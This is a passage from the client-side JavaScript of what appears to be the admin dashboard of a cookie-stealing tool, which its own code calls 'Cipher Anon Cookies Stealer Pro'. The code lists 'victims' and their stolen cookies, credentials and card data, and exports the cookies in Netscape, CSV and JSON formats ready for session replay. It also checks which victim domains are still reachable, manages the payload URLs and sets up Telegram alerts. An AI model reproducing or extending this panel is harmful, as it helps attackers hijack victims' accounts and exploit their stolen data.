            const resultMsg = document.getElementById('testResultModal');
            if (resultMsg) {
                resultMsg.className = 'test-result show valid';
                resultMsg.textContent = `✅ ${cleanDomain} — Opened in new tab`;
            }
            showToast('🔍 Opened ' + cleanDomain + ' in new tab', 'success');
            const btn = document.querySelector('.modal .session-actions .test');
            if (btn) { btn.textContent = '🔍'; btn.style.opacity = '1'; btn.disabled = false; }
        }

        async function testAllDomains() {
            if (isTestingAll) return;
            isTestingAll = true;
            const container = document.getElementById('testerResults');
            container.innerHTML = '<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ Testing...</div>';
            const domains = new Set();
            allData.forEach(entry => {
                let domain = extractDomain(entry);
                if (domain && !domain.includes('railway.app') && domain !== 'unknown') {
                    domains.add(domain);
                }
            });
            if (domains.size === 0) {
                container.innerHTML = '<div style="color:#64748b;font-size:12px;text-align:center;">No valid domains</div>';
                isTestingAll = false;
                return;
            }
            let results = [];
            let tested = 0;
            const total = domains.size;
            for (const domain of domains) {
                try {
                    const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://${domain}`)}`;
                    const response = await fetch(proxyUrl, { signal: AbortSignal.timeout(8000) });
                    results.push({ domain, valid: response.ok || response.status < 400, message: `✅ Valid (${response.status})` });
                } catch (e) {
                    results.push({ domain, valid: true, message: `⚠️ Check manually` });
                }
                tested++;
                container.innerHTML = `<div style="color:#00ff88;font-size:12px;text-align:center;">⏳ ${tested}/${total}</div>`;
            }
            let html = '';
            const validCount = results.filter(r => r.valid).length;
            html += `<div style="color:#64748b;font-size:11px;margin-bottom:6px;">✅ ${validCount} reachable · ⚠️ ${results.length - validCount} check manually</div>`;
            results.forEach(r => {
                const color = r.valid ? '#00ff88' : '#ff4444';
                const icon = r.valid ? '✅' : '⚠️';
                html += `
                    <div style="display:flex;justify-content:space-between;align-items:center;background:#0b0f1a;padding:4px 10px;border-radius:4px;border:1px solid ${r.valid ? '#1a2538' : '#2a1a1a'};">
                        <span style="color:#e2e8f0;font-size:12px;">${r.domain}</span>
                        <span style="color:${color};font-size:11px;">${icon} ${r.message}</span>
                    </div>
                `;
            });
            container.innerHTML = html;
            isTestingAll = false;
            showToast(`✅ ${validCount} reachable, ${results.length - validCount} check manually`, 'success');
        }

        // ============================================================
        // COPY & DOWNLOAD HELPERS — GLOBAL FUNCTIONS
        // ============================================================

        window.copyText = function(text) {
            navigator.clipboard.writeText(text).then(() => {
                showToast('✅ Copied!', 'success');
            }).catch(() => {
                const ta = document.createElement('textarea');
                ta.value = text;
                ta.style.position = 'fixed';
                ta.style.left = '-9999px';
                ta.style.top = '-9999px';
                document.body.appendChild(ta);
                ta.select();
                try { document.execCommand('copy'); showToast('✅ Copied!', 'success'); } catch(e) { showToast('❌ Copy failed', 'error'); }
                document.body.removeChild(ta);
            });
        }

        window.downloadItem = function(name, value, type) {
            const data = { name: name, value: value, type: type, exportedAt: new Date().toISOString() };
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            const safeName = name.replace(/[^a-zA-Z0-9]/g, '_');
            a.download = `${type}_${safeName}_${new Date().toISOString().slice(0,10)}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast(`📥 ${type} downloaded`, 'success');
        }

        window.togglePasswordVis = function(key, elementId) {
            passwordVisibility[key] = !passwordVisibility[key];
            const el = document.getElementById(elementId);
            if (el) {
                if (passwordVisibility[key]) {
                    el.classList.remove('password-hidden');
                    el.textContent = el.dataset.originalValue || el.textContent;
                } else {
                    el.classList.add('password-hidden');
                    el.textContent = el.textContent.replace(/[^\s]/g, '•');
                }
            }
            if (el && !el.dataset.originalValue) {
                el.dataset.originalValue = el.textContent;
            }
        }

        // ============================================================
        // EXPORT FUNCTIONS
        // ============================================================

        function downloadJSON() {
            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cookies_${new Date().toISOString().slice(0,10)}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('📥 JSON exported', 'success');
        }

        function downloadNetscape() {
            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
            let lines = ['# Netscape HTTP Cookie File', '# Generated by Cipher Anon Cookies Stealer Pro', ''];
            allData.forEach(entry => {
                const cookies = entry.cookies || {};
                const domain = extractDomain(entry);
                const cleanDomain = domain.startsWith('.') ? domain : '.' + domain;
                Object.entries(cookies).forEach(([name, value]) => {
                    const expiry = Math.floor(Date.now() / 1000) + 31536000;
                    lines.push(`${cleanDomain}\tTRUE\t/\tFALSE\t${expiry}\t${name}\t${value}`);
                });
            });
            const blob = new Blob([lines.join('\n')], { type: 'text/plain' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cookies_${new Date().toISOString().slice(0,10)}.txt`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('📥 Netscape exported', 'success');
        }

        function exportCSV() {
            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
            let rows = ['PC,Domain,Cookie Name,Cookie Value,IP,Country,Time'];
            allData.forEach(entry => {
                const pc = entry.pcName || entry.fingerprint?.hostname || entry.ip || 'Unknown PC';
                const domain = extractDomain(entry);
                const cookies = entry.cookies || {};
                Object.entries(cookies).forEach(([name, value]) => {
                    rows.push(`"${pc}","${domain}","${name}","${value.replace(/"/g, '""')}","${entry.ip || ''}","${entry.country || ''}","${entry.receivedAt || ''}"`);
                });
            });
            const csv = rows.join('\n');
            const blob = new Blob([csv], { type: 'text/csv' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cookies_${new Date().toISOString().slice(0,10)}.csv`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('📥 CSV exported', 'success');
        }

        function exportRawJSON() {
            if (allData.length === 0) { showToast('❌ No data', 'error'); return; }
            const blob = new Blob([JSON.stringify(allData, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cookies_raw_${new Date().toISOString().slice(0,10)}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast('📥 Raw JSON exported', 'success');
        }

        function downloadDomain(domain) {
            let cookies = {};
            allData.forEach(entry => {
                const entryDomain = extractDomain(entry);
                if (entryDomain === domain) {
                    Object.assign(cookies, entry.cookies || {});
                }
            });
            if (Object.keys(cookies).length === 0) { showToast('❌ No cookies found', 'error'); return; }
            const data = { domain: domain, cookies: cookies, exportedAt: new Date().toISOString() };
            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `cookies_${domain}_${new Date().toISOString().slice(0,10)}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showToast(`📥 Downloaded ${Object.keys(cookies).length} cookies for ${domain}`, 'success');
        }

        // ============================================================
        // DELETE FUNCTIONS
        // ============================================================

        function showDeleteConfirm(uniqueId, domain) {
            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
            showCustomConfirm('Move to Trash', `Move victim from ${domain} to trash?`, '🗑️', () => { deleteVictim(uniqueId, domain); }, false);
        }

        async function deleteVictim(uniqueId, domain) {
            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
            try {
                const res = await fetch(`/api/delete/${uniqueId}`, { method: 'DELETE' });
                if (res.status === 401) { window.location.href = '/login'; return; }
                const data = await res.json();
                if (data.status === 'ok') {
                    showToast(`🗑️ Victim moved to trash`, 'success');
                    await fetchData();
                    await fetchTrash();
                    closeModal();
                } else {
                    showToast('❌ ' + (data.message || 'Failed'), 'error');
                }
            } catch (e) { showToast('❌ Error deleting', 'error'); }
        }

        function showRestoreConfirm(uniqueId, domain) {
            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
            showCustomConfirm('Restore Victim', `Restore victim to ${domain}?`, '↩️', () => { restoreVictim(uniqueId, domain); }, false);
        }

        async function restoreVictim(uniqueId, domain) {
            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
            try {
                const res = await fetch(`/api/restore/${uniqueId}`, { method: 'POST' });
                if (res.status === 401) { window.location.href = '/login'; return; }
                const data = await res.json();
                if (data.status === 'ok') {
                    showToast(`↩️ Victim restored to ${domain}`, 'success');
                    await fetchTrash();
                    await fetchData();
                    closeModal();
                } else {
                    showToast('❌ ' + (data.message || 'Failed'), 'error');
                }
            } catch (e) { showToast('❌ Error restoring', 'error'); }
        }

        function showPermanentDeleteConfirm(uniqueId) {
            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
            showCustomConfirm('Permanently Delete', 'This cannot be undone.', '⚠️', () => { permanentlyDeleteTrash(uniqueId); }, true);
        }

        async function permanentlyDeleteTrash(uniqueId) {
            if (!uniqueId || uniqueId === 'unknown') { showToast('❌ Invalid victim ID', 'error'); return; }
            try {
                const res = await fetch(`/api/trash/permanent/${uniqueId}`, { method: 'DELETE' });
                if (res.status === 401) { window.location.href = '/login'; return; }
                const data = await res.json();
                if (data.status === 'ok') {
                    showToast(`🗑️ Victim permanently deleted`, 'success');
                    await fetchTrash();
                    closeModal();
                } else {
                    showToast('❌ ' + (data.message || 'Failed'), 'error');
                }
            } catch (e) { showToast('❌ Error deleting', 'error'); }
        }

        function showEmptyTrashConfirm() {
            showCustomConfirm('Empty Trash', 'This will permanently delete ALL victims in trash.', '⚠️', () => { emptyTrash(); }, true);
        }

        async function emptyTrash() {
            try {
                const res = await fetch('/api/trash/empty', { method: 'DELETE' });
                if (res.status === 401) { window.location.href = '/login'; return; }
                const data = await res.json();
                if (data.status === 'ok') {
                    showToast(`🗑️ Trash emptied (${data.count} victims)`, 'success');
                    await fetchTrash();
                } else {
                    showToast('❌ ' + (data.message || 'Failed'), 'error');
                }
            } catch (e) { showToast('❌ Error emptying trash', 'error'); }
        }

        function showClearAllConfirm() {
            showCustomConfirm('Clear All Data', 'This will permanently delete ALL stolen data.', '⚠️', () => { clearData(); }, true);
        }

        async function clearData() {
            try {
                const res = await fetch('/api/clear', { method: 'DELETE' });
                if (res.status === 401) { window.location.href = '/login'; return; }
                await fetchData();
                await fetchTrash();
                showToast('🗑️ All data cleared', 'success');
            } catch(e) { showToast('❌ Error clearing data', 'error'); }
        }

        // ============================================================
        // SETTINGS
        // ============================================================

        function openSettings() {
            document.getElementById('settingsOverlay').classList.add('active');
            document.getElementById('oldPassword').value = '';
            document.getElementById('newPassword').value = '';
            document.getElementById('confirmPassword').value = '';
            document.querySelectorAll('.error-text').forEach(el => el.classList.remove('show'));
            loadTelegramSettings();
        }

        function closeSettings() {
            document.getElementById('settingsOverlay').classList.remove('active');
        }

        async function changePassword() {
            const oldPass = document.getElementById('oldPassword').value;
            const newPass = document.getElementById('newPassword').value;
            const confirmPass = document.getElementById('confirmPassword').value;
            document.querySelectorAll('.error-text').forEach(el => el.classList.remove('show'));
            let valid = true;
            if (!oldPass) { document.getElementById('oldPasswordError').textContent = 'Enter current password'; document.getElementById('oldPasswordError').classList.add('show'); valid = false; }
            if (newPass.length < 4) { document.getElementById('newPasswordError').classList.add('show'); valid = false; }
            if (newPass !== confirmPass) { document.getElementById('confirmPasswordError').classList.add('show'); valid = false; }
            if (!valid) return;
            try {
                const res = await fetch('/api/change-password', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ oldPassword: oldPass, newPassword: newPass })
                });
                if (res.status === 401) { window.location.href = '/login'; return; }
                const data = await res.json();
                if (data.status === 'ok') {
                    showToast('✅ Password changed!', 'success');
                    closeSettings();
                    setTimeout(() => { window.location.href = '/password-success'; }, 1000);
                } else if (data.message === 'Current password is incorrect') {
                    document.getElementById('oldPasswordError').textContent = 'Current password is incorrect';
                    document.getElementById('oldPasswordError').classList.add('show');
                } else {
                    showToast('❌ ' + (data.message || 'Failed'), 'error');
                }
            } catch (e) { showToast('❌ Error changing password', 'error'); }
        }

        async function loadTelegramSettings() {
            try {
                const res = await fetch('/api/config/telegram');
                if (res.status === 401) { window.location.href = '/login'; return; }
                const data = await res.json();
                if (data) {
                    document.getElementById('telegramToken').value = data.botToken || '';
                    document.getElementById('telegramChatId').value = data.chatId || '';
                    document.getElementById('telegramNotifications').checked = data.notifications !== false;
                }
            } catch (e) { console.log('Failed to load Telegram'); }
        }

        async function updateTelegramSettings() {
            const botToken = document.getElementById('telegramToken').value.trim();
            const chatId = document.getElementById('telegramChatId').value.trim();
            const notifications = document.getElementById('telegramNotifications').checked;
            if (!botToken || !chatId) { showToast('❌ Bot token and chat ID required', 'error'); return; }
            if (!botToken.match(/^\d+:[A-Za-z0-9_-]+$/)) { showToast('❌ Invalid token format', 'error'); return; }
            try {
                const res = await fetch('/api/config/telegram', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ botToken, chatId, notifications })
                });
                if (res.status === 401) { window.location.href = '/login'; return; }
                const data = await res.json();
                if (data.status === 'ok') {
                    showToast('✅ Telegram settings updated!', 'success');
                } else {
                    showToast('❌ ' + data.message, 'error');
                }
            } catch (e) { showToast('❌ Failed to update', 'error'); }
        }

        // ============================================================
        // LOGOUT
        // ============================================================

        function showLogoutConfirm() {
            document.getElementById('logoutConfirmOverlay').classList.add('active');
        }

        function hideLogoutConfirm() {
            document.getElementById('logoutConfirmOverlay').classList.remove('active');
        }

        function executeLogout() {
            hideLogoutConfirm();
            window.location.href = '/logout';
        }

        // ============================================================
        // INIT
        // ============================================================

        document.addEventListener('DOMContentLoaded', function() {
            checkSession().then((valid) => {
                if (!valid) return;
                const navItems = document.querySelectorAll('.sidebar .nav-item[data-view]');
                navItems.forEach(item => {
                    item.addEventListener('click', function() {
                        const view = this.dataset.view;
                        if (view) switchView(view);
                    });
                });
                
                // Update payload URLs on load
                updatePayloadUrls();
                
                fetchData();
                fetchTrash();
                fetchVisitors();
                setInterval(() => {
                    if (currentView === 'main') { fetchData(); fetchVisitors(); }
                    else if (currentView === 'trash') fetchTrash();
                    else if (currentView === 'cookies') renderCookiesView();
                    else if (currentView === 'victims') renderVictimsView();
                    else if (currentView === 'creds') renderCredsView();
                    else if (currentView === 'cards') renderCardsView();
                    else if (currentView === 'storage') renderStorageView();
                    else if (currentView === 'replay') renderReplayView();
                    else if (currentView === 'payload') updatePayloadUrls();
                }, 10000);
                document.getElementById('trashCount').textContent = trashData.length;
            });
        });

        document.addEventListener('keydown', function(e) {
            if (e.key === 'Escape') {
                closeModal();
                closeSettings();
                closeSidebar();
                hideLogoutConfirm();
                hideCustomConfirm();
                closeRename();
            }
        });

        console.clear();
    </script>
</body>
</html>
